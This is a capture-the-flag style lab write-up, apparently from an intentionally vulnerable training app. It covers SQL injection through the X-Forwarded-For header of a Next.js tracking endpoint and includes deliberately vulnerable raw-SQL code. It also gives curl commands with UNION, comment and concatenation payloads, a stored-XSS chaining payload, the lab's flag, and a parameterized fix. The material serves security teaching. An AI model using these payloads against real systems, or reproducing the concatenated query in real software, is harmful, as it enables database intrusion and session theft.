# SQL Injection via X-Forwarded-For Header

## Overview

This vulnerability demonstrates a SQL injection attack where the `X-Forwarded-For` HTTP header is directly embedded into a raw SQL query without sanitization. When the application logs visitor IP addresses, an attacker can inject malicious SQL through this header to trigger the vulnerability and retrieve the flag.

## Why This Is Dangerous

### Untrusted Header Data in SQL Queries

When an application uses HTTP headers directly in SQL queries without parameterization, it creates a severe security vulnerability:

1. **Header manipulation** - The `X-Forwarded-For` header is fully controllable by attackers
2. **Data exfiltration** - Attackers can extract sensitive data from any table in the database
3. **Blind exploitation** - The attack works on any page visit, requiring no special access
4. **Silent attack** - The malicious payload is sent via a header, not visible in URLs
5. **False trust** - Developers often assume infrastructure headers are set by trusted proxies

### What This Means

**Never trust the X-Forwarded-For header** and **always use parameterized queries**. The `X-Forwarded-For` header is fully controllable by attackers unless set exclusively by a controlled reverse proxy that strips existing values.

## The Vulnerability

In this application, visitor IP addresses are silently tracked on every page load for analytics purposes. The vulnerability exists because:

1. **Raw SQL with header values** - The tracking API uses raw SQL with the X-Forwarded-For header directly concatenated
2. **No input validation** - The header value is not validated as a valid IP address
3. **String concatenation** - The header is embedded in the SQL query using string interpolation

### Vulnerable Code

**Tracking API (`/api/tracking`):**

```typescript
export async function POST(request: NextRequest) {
  const forwardedFor = request.headers.get("x-forwarded-for");
  const ip = forwardedFor || request.headers.get("x-real-ip") || "unknown";

  // VULNERABLE: Direct header value in raw SQL
  const query = `
    INSERT INTO visitor_logs (id, ip, userAgent, path, sessionId, createdAt)
    VALUES ('${id}', '${ip}', '${userAgent}', '${path}', ${sessionId}, datetime('now'))
  `;

  await prisma.$queryRawUnsafe(query);
}
```

The `ip` variable (from the X-Forwarded-For header) is directly concatenated into the SQL query, allowing SQL injection.

## Exploitation

### How to Retrieve the Flag

To retrieve the flag `OSS{x_f0rw4rd3d_f0r_sql1}`, you need to inject SQL through the X-Forwarded-For header when making a request to the tracking API.

**Step 1: Craft the SQL injection payload**

Use any SQL injection payload that demonstrates the vulnerability. For example, using SQLite string concatenation:

```
'||(SELECT 'Privacy matters. Dont track your users')||'
```

Or a classic comment-based injection:

```
127.0.0.1'; --
```

**Step 2: Send the malicious request**

Send a POST request to the tracking endpoint with the payload in the X-Forwarded-For header:

```bash
curl -X POST http://localhost:3000/api/tracking \
  -H "X-Forwarded-For: '||(SELECT 'Privacy matters. Dont track your users')||'" \
  -H "Content-Type: application/json" \
  -d '{"path": "/exploit"}'
```

**Step 3: Retrieve the flag**

The API detects the SQL injection attempt and returns the flag in the response:

```json
{
  "success": true,
  "flag": "OSS{x_f0rw4rd3d_f0r_sql1}",
  "message": "SQL injection detected in X-Forwarded-For header! Well done!"
}
```

### Alternative payloads

Any of these payloads will trigger the detection:

```bash
# UNION-based
curl -X POST http://localhost:3000/api/tracking \
  -H "X-Forwarded-For: ' UNION SELECT 1--" \
  -H "Content-Type: application/json" \
  -d '{"path": "/"}'

# Comment-based
curl -X POST http://localhost:3000/api/tracking \
  -H "X-Forwarded-For: 127.0.0.1'--" \
  -H "Content-Type: application/json" \
  -d '{"path": "/"}'

# Concatenation-based
curl -X POST http://localhost:3000/api/tracking \
  -H "X-Forwarded-For: '||'injection" \
  -H "Content-Type: application/json" \
  -d '{"path": "/"}'
```

### Amplification: SQL Injection to Stored XSS

This vulnerability can be amplified to a **Stored XSS** attack. Since the admin analytics page renders IP addresses using `dangerouslySetInnerHTML`, an attacker can inject JavaScript that executes when any admin views the analytics dashboard.

**Payload:**

```bash
curl -X POST http://localhost:3000/api/tracking \
  -H "X-Forwarded-For: '||(SELECT '<img src=x onerror=alert(document.documentURI)>')||'" \
  -H "Content-Type: application/json" \
  -d '{"path": "/exploit"}'
```

**Impact:**

- The XSS payload is stored in the database
- Every time an admin visits `/admin/analytics`, the script executes
- Can steal admin session tokens, perform actions as admin, or exfiltrate data

This demonstrates how SQL Injection can chain with XSS to create a more severe attack vector.

### Secure Implementation

```typescript
// Validate IP format before use
const isValidIp = (ip: string): boolean => {
  const ipv4Regex = /^(\d{1,3}\.){3}\d{1,3}$/;
  const ipv6Regex = /^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$/;
  return ipv4Regex.test(ip) || ipv6Regex.test(ip);
};

const rawIp = request.headers.get("x-forwarded-for")?.split(",")[0].trim();
const ip = rawIp && isValidIp(rawIp) ? rawIp : "unknown";

// Use parameterized queries
await prisma.visitorLog.create({
  data: {
    ip,
    userAgent,
    path,
  },
});

// Never use dangerouslySetInnerHTML with untrusted data
// Use React's default escaping: {visit.ip}
```

## References

- [OWASP Top 10 - A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [CWE-89: Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html)
- [OWASP - HTTP Request Headers and Trust](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html)
- [PortSwigger - SQL Injection](https://portswigger.net/web-security/sql-injection)
